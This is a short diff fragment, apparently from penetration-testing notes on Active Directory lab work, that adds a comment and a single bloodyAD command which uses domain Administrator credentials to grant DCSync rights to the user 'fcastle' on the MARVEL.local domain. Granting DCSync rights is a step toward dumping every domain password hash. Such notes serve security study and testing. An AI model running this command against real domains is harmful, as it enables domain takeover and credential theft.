@@ -141,6 +141,8 @@ Misconfigured permissions can let non-admin users do this.
 
 
 
+#if you have any domain admins and administrator credentials.
+sudo bloodyAD --host 192.168.154.134 -d MARVEL.local -u Administrator -p 'P@$$w0rd' add dcsync fcastle
 
 
 
